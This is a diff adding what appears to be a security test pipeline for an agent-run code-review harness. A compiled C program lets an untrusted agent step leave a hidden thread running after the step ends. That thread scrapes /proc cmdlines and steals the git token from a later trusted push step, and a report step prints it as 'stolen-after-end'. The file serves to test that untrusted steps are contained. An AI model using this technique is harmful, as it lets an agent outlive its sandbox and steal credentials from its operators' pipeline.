@@ -1,0 +1,58 @@
+secrets:
+  - name: GIT_TOKEN
+    provider: env
+    key: REVIEW_GIT_TOKEN
+steps:
+  # Trusted: makes the program that the agent brings. python3 with ctypes does
+  # the same: the main thread calls the system call exit, a second thread runs.
+  - id: build
+    run: |
+      rm -f /tmp/review-seen
+      cat > /tmp/review-watch.c <<'EOF'
+      #include <pthread.h>
+      #include <stdlib.h>
+      #include <sys/syscall.h>
+      #include <unistd.h>
+      static void *watch(void *arg) {
+        (void)arg;
+        sleep(2);
+        for (int i = 0; i < 100; i++) {
+          system("cat /proc/[0-9]*/cmdline 2>/dev/null | tr '\\000' '\\n' >> /tmp/review-seen");
+          usleep(100000);
+        }
+        return 0;
+      }
+      int main(void) {
+        pthread_t t;
+        pthread_create(&t, 0, watch, 0);
+        usleep(200000);
+        syscall(SYS_exit, 0);
+        return 0;
+      }
+      EOF
+      gcc -O2 -pthread -o /tmp/review-watch /tmp/review-watch.c
+      chmod 755 /tmp/review-watch
+
+  # Untrusted: the agent leaves the program. Its leader is a zombie, and its
+  # thread is not in the list of /proc, so the end of the step does not stop it.
+  - id: code
+    depends: [build]
+    untrusted: true
+    run: |
+      /tmp/review-watch </dev/null >/dev/null 2>&1 &
+      sleep 1
+      echo "agent:done"
+
+  # Trusted, after the end of the untrusted step: the push with the token in
+  # the URL. The child sh stands for git.
+  - id: push
+    depends: [code]
+    secrets: [GIT_TOKEN]
+    run: sh -c 'sleep 3' git-push "https://x-access-token:${GIT_TOKEN}@git.example/app.git"
+
+  - id: report
+    depends: [push]
+    run: |
+      grep -o 'review-token-[a-z0-9]*' /tmp/review-seen 2>/dev/null | head -1 | rev | sed 's/^/stolen-after-end-reversed=/'
+      echo "report:done"
+      rm -f /tmp/review-seen /tmp/review-watch /tmp/review-watch.c
